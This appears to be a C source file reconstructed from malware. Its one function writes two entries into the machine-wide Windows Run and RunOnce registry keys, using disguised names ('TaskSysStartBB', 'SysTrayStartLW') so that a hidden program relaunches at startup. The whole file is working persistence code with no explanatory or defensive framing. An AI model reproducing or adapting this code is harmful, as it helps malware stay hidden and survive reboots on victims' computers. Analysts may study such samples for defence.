#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

void _WinStartup(void)
{
    // Copy windoze to winreg and ensure null-termination
    strcpy(_winreg, _windoze);
    // (The original also had a null-termination check, but strcpy does it)

    RegCreateKeyA((HKEY)0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &_hKey);
    RegSetValueExA(_hKey, "TaskSysStartBB", 0, REG_SZ, (const BYTE*)_winreg, sizeof(_winreg));
    RegCloseKey(_hKey);

    // Copy sysdoze to sysreg and ensure null-termination
    strcpy(_sysreg, _sysdoze);

    RegCreateKeyA((HKEY)0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &_hKey);
    RegSetValueExA(_hKey, "SysTrayStartLW", 0, REG_SZ, (const BYTE*)_sysreg, sizeof(_sysreg));
    RegCloseKey(_hKey);

    return;
}
#pragma optimize("", on)
